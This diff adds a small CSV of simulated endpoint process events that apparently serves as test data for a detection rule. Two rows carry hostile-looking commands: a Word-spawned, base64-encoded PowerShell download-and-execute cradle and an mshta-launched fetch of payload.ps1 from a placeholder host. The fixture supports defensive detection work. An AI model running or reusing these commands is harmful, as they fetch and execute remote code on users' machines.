@@ -1,0 +1,5 @@
+TimeGenerated,DeviceName,AccountName,FileName,ProcessCommandLine,InitiatingProcessFileName,InitiatingProcessCommandLine,Expected
+2026-02-12T11:00:00Z,WS-FIN-07,CONTOSO\\mario,powershell.exe,"powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHgAYQBtAHAAbABlAC4AYwBvAG0AJwApAA==",winword.exe,"winword.exe invoice.docm",match
+2026-02-12T11:02:00Z,WS-IT-01,CONTOSO\\admin,powershell.exe,"powershell.exe -ExecutionPolicy Bypass -File C:\\Admin\\inventory.ps1",mmc.exe,"mmc.exe compmgmt.msc",review-admin-context
+2026-02-12T11:04:00Z,WS-MKT-05,CONTOSO\\sara,pwsh.exe,"pwsh.exe -c Invoke-WebRequest https://example.invalid/payload.ps1",mshta.exe,"mshta.exe https://example.invalid/landing.hta",match
+2026-02-12T11:06:00Z,WS-ENG-02,CONTOSO\\dev,powershell.exe,"powershell.exe Get-ChildItem C:\\Projects",code.exe,"code.exe C:\\Projects\\demo",no-match-benign-command
